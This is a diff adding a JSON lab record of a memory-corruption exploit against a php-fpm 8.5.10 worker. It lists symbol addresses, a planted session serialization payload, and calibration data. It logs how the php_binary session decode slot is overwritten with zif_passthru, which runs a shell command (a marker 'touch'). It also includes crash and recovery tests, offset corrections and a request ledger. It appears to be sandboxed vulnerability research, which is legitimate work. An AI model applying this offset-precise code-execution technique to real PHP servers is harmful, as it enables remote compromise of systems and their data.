@@ -1,0 +1,178 @@
+{
+  "schema": "realzif_passthru_distro_v1",
+  "stamp": "20261022T013000Z",
+  "lab": "/tmp/opencode/research/realzif_20261022T013000Z",
+  "target": {
+    "binary": "/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm",
+    "md5": "4ee099823b75e16ea36f93c71d57bfd8",
+    "elf": "ET_EXEC",
+    "php": "8.5.10",
+    "sapi": "fpm-fcgi",
+    "zts": false,
+    "ini": "-n",
+    "ld_library_path": "/tmp/opencode/realapps/icu-out/lib"
+  },
+  "lab_config": {
+    "port": 28890,
+    "aslr": "disabled per instance (setarch x86_64 -R)",
+    "pm": "static",
+    "pm_max_children": 1,
+    "pm_max_requests": 0,
+    "session_serialize_handler": "php_binary",
+    "session_upload_progress": true,
+    "master_pid": 142049,
+    "initial_worker_pid": 142050,
+    "final_worker_pid": 142370,
+    "poison_respawn_worker_pid": 143459
+  },
+  "static": {
+    "ps_serializers": "0x22c54a0",
+    "struct_stride": 24,
+    "ps_globals": "0x22d0dc0",
+    "ps_globals_serializer_field": "0x22d0f20",
+    "php_session_decode": "0x9e68b5",
+    "php_session_decode_call_site": "0x9e68fe",
+    "entries": [
+      {"idx": 0, "struct": "0x22c54a0", "name": "php_serialize", "encode": "0x9e2078", "decode": "0x9e20de", "decode_slot": "0x22c54b0"},
+      {"idx": 1, "struct": "0x22c54b8", "name": "php", "encode": "0x9e7112", "decode": "0x9e6fae", "decode_slot": "0x22c54c8"},
+      {"idx": 2, "struct": "0x22c54d0", "name": "php_binary", "encode": "0x9e6b15", "decode": "0x9e6dd5", "decode_slot": "0x22c54e0"},
+      {"idx": 3, "struct": "0x22c54e8", "name": null, "encode": null, "decode": null, "decode_slot": "0x22c54f8"}
+    ],
+    "zif_exec": "0xa3c04e",
+    "zif_system": "0xa3c061",
+    "zif_passthru": "0xa3c074",
+    "zif_size": "0x13",
+    "php_exec_ex": "0xa3bdfd",
+    "php_exec": "0xa3bbd7",
+    "no_array_call": "0xa3c042",
+    "after_php_exec": "0xa3c047",
+    "abi": {"sizeof_execute_data": 80, "num_args": "0x2c", "arg1": "0x50", "arg1_type": "0x58"}
+  },
+  "plant": {
+    "payload": "a:2:{i:0;s:3:\"aaa\";i:0;s:3:\"bbb\";}X",
+    "level": 1,
+    "P": "0x7ffff4681000",
+    "B0": "0x7ffff4684000",
+    "entries_used": 3,
+    "dtor_used": 1
+  },
+  "calibration": {
+    "X1": "0x7ffff466a000",
+    "X2": "0x7ffff46ae000",
+    "T1": 131014,
+    "T2": 131313,
+    "hit1_ser2decode": "0x9e6dd5",
+    "hit2_ser2decode": "0x9e6dd5",
+    "pser": "0x22c54d0",
+    "worker": 142050,
+    "worker_crashed_after_measurement": true,
+    "respawn": 142370
+  },
+  "final": {
+    "total": 131014,
+    "rec1_len": 108,
+    "L": 130892,
+    "Q": "0x78",
+    "P": "0x7ffff4681000",
+    "B0": "0x7ffff4684000",
+    "K": -8796078587571,
+    "A_target": "0x22c54e0",
+    "write_value": "0xa3c074",
+    "F": "0x7ffff46ae190",
+    "cmd_len": 67,
+    "cmd": "touch /tmp/opencode/research/realzif_20261022T013000Z/PASSTHRU_REAL",
+    "hit2_ser2decode": "0xa3c074",
+    "hit2_pser": "0x22c54d0",
+    "zif_passthru_rdi": "0x7ffff46ae018",
+    "zif_passthru_rsi": "0x200f1",
+    "php_exec_ex_mode": 3,
+    "php_exec_type": 3,
+    "after_php_exec_eax": 0,
+    "marker": {"path": "PASSTHRU_REAL", "mtime": "2026-10-22 01:33:05.589960259 +0200", "inode": 3203722, "size": 0},
+    "response": {"status_first_line": "X-Powered-By: PHP/8.5.10", "worker_pid": 142370, "same_worker_after": true},
+    "worker_alive_after": true,
+    "passthru_crash": null,
+    "post_slot_worker": "0xa3c074",
+    "post_slot_master": "0x9e6dd5"
+  },
+  "poison": {
+    "post_final_worker_slot": "0xa3c074",
+    "post_final_master_slot": "0x9e6dd5",
+    "clean_case": {
+      "sid": "ctrl",
+      "file_len": 141,
+      "num_args": 0,
+      "result": "PHP fatal ArgumentCountError (nested decode parse), no connection reset",
+      "worker": 142370,
+      "worker_alive": true,
+      "slot_after": "0xa3c074",
+      "sigsegv": false
+    },
+    "crash_case": {
+      "sid": "crash",
+      "file_len": 141,
+      "num_args": 1,
+      "arg1": "0x4141414141414141",
+      "arg1_type": 6,
+      "result": "SIGSEGV in zend_str_has_nul_byte via zend_parse_arg_path_str/php_exec_ex/zif_passthru/php_session_decode",
+      "fault_rip": "0x7ffff6981858",
+      "fault_instruction": "vpcmpeqb (%rdi),%ymm16,%k0",
+      "fault_rdi": "0x4141414141414159",
+      "fpm_log": "child 142370 exited on signal 11 (SIGSEGV)",
+      "respawn_worker": 143459,
+      "respawn_slot": "0x9e6dd5"
+    },
+    "recovery": {
+      "sid": "recover",
+      "file_len": 14,
+      "result": "HTTP 200 PID=143459 SID=recover FOO=bar",
+      "slot_after": "0x9e6dd5"
+    },
+    "operational_impact": "Poison is worker-local and persists across non-crashing session decodes; only worker recycle/respawn restores the master's pristine decode. Proactively kill/reload workers after compromise."
+  },
+  "offset_mismatch": [
+    {
+      "item": "ps_serializers decode slot",
+      "supplied": "ps_serializers[1].decode = 0x22c54c8",
+      "entry1": "php decode 0x9e6fae",
+      "correct_for_php_binary": "ps_serializers[2].decode = 0x22c54e0, real decode 0x9e6dd5",
+      "consequence": "Using 0x22c54c8 overwrites the php decode slot; the php_binary dispatch at 0x22c54e0 remains 0x9e6dd5 and the stale-chain write is not reached with session.serialize_handler=php_binary. The final live table shows 0x22c54c8=0x9e6fae unchanged and 0x22c54e0=0xa3c074 patched."
+    },
+    {
+      "item": "zif_passthru - zif_system",
+      "supplied": "zif_system=0xa3c061, zif_passthru=0xa3c074",
+      "delta": "0x13",
+      "expected_v6_delta": "0x10",
+      "reason": "Both are 19-byte functions: sub $8,%rsp; mov $mode,%edx; call php_exec_ex; add $8,%rsp; ret.",
+      "consequence": "The supplied passthru address is correct. A +0x10 derivation gives 0xa3c071, inside zif_system's add/ret epilogue, not a function entry."
+    },
+    {
+      "item": "record payload start Q",
+      "supplied_v6": "0x77",
+      "actual": "0x78",
+      "reason": "zif_passthru 0xa3c074 is 10731636 (8 decimal digits); record 1's i:10731636; is one byte longer than the V6 7-digit value.",
+      "consequence": "The fake arg1 pointer must be computed from Q (0x78); a hard-coded 0x77 points one byte before F. Builder fixed to use Q."
+    }
+  ],
+  "requests": {
+    "count": 8,
+    "budget": 40,
+    "ledger": [
+      {"n": 1, "kind": "probe", "label": "liveness", "result": "200 PID=142050"},
+      {"n": 2, "kind": "plant", "label": "user_error", "result": "fatal stop; level=1; P=0x7ffff4681000 B0=0x7ffff4684000"},
+      {"n": 3, "kind": "calib", "label": "rcal", "result": "connection reset; X1=0x7ffff466a000 X2=0x7ffff46ae000 T2=131313; worker 142050 crashed after measurement, respawn 142370"},
+      {"n": 4, "kind": "plant", "label": "user_error", "result": "fatal stop; same P/B0 on 142370"},
+      {"n": 5, "kind": "trigger", "label": "rfin", "result": "200 PID=142370; hit2 ser2decode=0xa3c074; marker; AFTER eax=0; worker alive"},
+      {"n": 6, "kind": "sess", "label": "ctrl", "result": "PHP fatal ArgumentCountError; worker alive; slot 0xa3c074; no SIGSEGV"},
+      {"n": 7, "kind": "sess", "label": "crash", "result": "connection reset; SIGSEGV in zend_str_has_nul_byte; child 142370 respawn 143459"},
+      {"n": 8, "kind": "sess", "label": "recover", "result": "200 PID=143459 FOO=bar; slot 0x9e6dd5"}
+    ]
+  },
+  "shutdown": {
+    "method": "SIGTERM to master 142049",
+    "time": "2026-10-22 01:35:20 +0200",
+    "port_28890": "closed",
+    "lab_processes": "none",
+    "shared_services_touched": false
+  }
+}
